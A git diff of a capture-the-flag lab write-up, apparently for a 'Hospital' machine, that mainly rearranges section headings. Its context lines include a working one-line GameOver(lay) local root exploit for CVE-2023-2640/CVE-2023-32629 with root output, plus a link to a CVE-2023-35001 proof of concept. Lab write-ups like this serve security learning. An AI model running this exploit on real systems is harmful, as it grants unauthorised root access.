@@ -198,6 +198,8 @@ Per the session cookie name, it seems that this is the [Roundcube](https://githu
 
 ![Hospital Webmail](images/hospital_webmail_login.png)
 
+## Internal VM - 192.168.5.2
+
 And it seems we have another kind of webapp on the `port 8080`.
 
 ```bash
@@ -513,9 +515,7 @@ Session completed.
 
 I tried these password in different places, but didn't find much.
 
-## GameOver(lay) - CVE-2023-2640 and CVE-2023-32629
-
-### PoC
+### GameOver(lay) - CVE-2023-2640 and CVE-2023-32629
 
 ```bash
 unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("rm -rf l m u w; id")'
@@ -541,9 +541,7 @@ root@webserver:/var/www/html/uploads# id
 uid=0(root) gid=33(www-data) groups=33(www-data)
 ```
 
-## [CVE-2023-35001](https://github.com/rafamarrara/CTFs/tree/main/Labs/CVE-2023-35001)
-
-### PoC
+### [CVE-2023-35001](https://github.com/rafamarrara/CTFs/tree/main/Labs/CVE-2023-35001)
 
 I cloned this [PoC exploit](https://github.com/synacktiv/CVE-2023-35001)
 
